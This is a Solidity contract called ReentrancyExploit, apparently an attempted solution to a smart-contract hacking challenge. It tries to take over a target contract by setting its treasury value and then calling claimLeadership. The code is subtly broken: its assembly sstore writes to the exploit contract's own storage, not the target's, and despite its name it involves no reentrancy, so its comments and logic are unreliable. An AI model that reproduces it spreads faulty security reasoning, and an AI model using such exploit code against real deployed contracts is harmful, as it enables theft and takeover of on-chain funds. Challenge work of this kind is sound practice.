pragma solidity ^0.8.0;

interface IHigherOrder {
    function registerTreasury(uint8 amount) external;
    function claimLeadership() external;
}

contract ReentrancyExploit {
    IHigherOrder public target;

    constructor(address _target) {
        target = IHigherOrder(_target);
    }

    function exploit() public {
        uint256 value = 256;
        // Overwrite the treasury storage slot directly using assembly
        assembly {
            sstore(1, value) // Slot 1 corresponds to the treasury variable
        }
        target.claimLeadership();
    }
}